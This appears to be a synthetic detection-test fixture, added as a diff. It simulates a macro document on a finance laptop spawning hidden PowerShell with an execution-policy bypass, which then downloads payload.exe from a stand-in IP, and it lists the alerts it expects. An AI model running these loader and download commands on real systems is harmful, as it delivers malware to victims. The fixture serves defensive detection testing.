@@ -1,0 +1,50 @@
+{
+  "type": "scenario-bundle",
+  "id": "scenario-bundle--malicious-001",
+  "spec_version": "1.0",
+  "name": "Word spawns PowerShell",
+  "created": "2026-04-16T09:15:00Z",
+  "modified": "2026-04-16T09:15:00Z",
+  "labels": ["synthetic", "malicious", "ransomware", "windows-endpoint"],
+  "objective": "Simulate an initial malicious office document that launches PowerShell before encryption begins.",
+  "host_profile": {
+    "hostname": "finance-laptop-01",
+    "os": "Windows 11",
+    "department": "finance"
+  },
+  "timeline": [
+    {"offset_seconds": 0, "event_ref": "event--001"},
+    {"offset_seconds": 3, "event_ref": "event--002"},
+    {"offset_seconds": 7, "event_ref": "event--003"}
+  ],
+  "events": [
+    {
+      "id": "event--001",
+      "event_type": "process_create",
+      "process_name": "winword.exe",
+      "parent_process_name": "explorer.exe",
+      "command_line": "C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE C:/Users/Alice/Downloads/invoice.docm"
+    },
+    {
+      "id": "event--002",
+      "event_type": "process_create",
+      "process_name": "powershell.exe",
+      "parent_process_name": "winword.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:/Users/Alice/AppData/Local/Temp/loader.ps1",
+      "stage": "pre-impact"
+    },
+    {
+      "id": "event--003",
+      "event_type": "command_exec",
+      "process_name": "powershell.exe",
+      "parent_process_name": "winword.exe",
+      "command_line": "Invoke-WebRequest http://198.51.100.10/payload.exe -OutFile C:/Users/Alice/AppData/Local/Temp/payload.exe",
+      "stage": "pre-impact"
+    }
+  ],
+  "expected_findings": {
+    "severity": "high",
+    "rules_triggered": ["suspicious_parent_child", "suspicious_command_execution"],
+    "attack_techniques": ["T1059.001"]
+  }
+}
